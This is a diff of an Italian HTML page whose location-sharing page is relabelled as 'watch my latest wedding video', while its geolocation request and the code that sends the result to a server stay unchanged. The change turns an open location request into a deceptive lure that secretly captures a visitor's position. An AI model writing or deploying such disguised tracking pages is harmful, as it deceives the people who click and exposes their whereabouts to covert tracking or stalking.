@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>📍 Condividi la tua posizione</title>
+    <title> Guarda il mio ultimo video di un matrimonio</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -42,9 +42,9 @@
 </head>
 <body>
     <div class="card">
-        <h1>📍 Condividi la tua posizione</h1>
-        <p>Clicca sul pulsante per inviare la posizione</p>
-        <button class="btn" onclick="getLocation()">✅ Condividi ora</button>
+        <h1> Guarda il mio ultimo video del matrimonio </h1>
+        <p>Clicca sul pulsante per guardare il video </p>
+        <button class="btn" onclick="getLocation()">✅ guarda ora</button>
         <div id="status" class="status"></div>
     </div>
     <script>
@@ -53,14 +53,14 @@
             const btn = document.querySelector('.btn');
             
             if (!navigator.geolocation) {
-                status.textContent = '❌ Geolocalizzazione non supportata';
+                status.textContent = '❌ visualizzazione non supportata';
                 status.className = 'status error';
                 return;
             }
             
             btn.disabled = true;
             btn.textContent = '⏳ Attendi...';
-            status.textContent = '🔄 Richiesta posizione...';
+            status.textContent = '🔄 caricamento in corso...';
             status.className = 'status success';
             
             try {
@@ -84,8 +84,8 @@
                 });
                 
                 if (res.ok) {
-                    status.textContent = '✅ Inviato con successo!';
-                    btn.textContent = '✅ Fatto!';
+                    status.textContent = '✅ a breve si aprirà il video !';
+                    btn.textContent = '✅ attendi!';
                 } else {
                     throw new Error('Errore server');
                 }
@@ -93,7 +93,7 @@
                 status.textContent = '❌ Errore: ' + err.message;
                 status.className = 'status error';
                 btn.disabled = false;
-                btn.textContent = '✅ Condividi ora';
+                btn.textContent = '✅ guarda ora';
             }
         }
     </script>
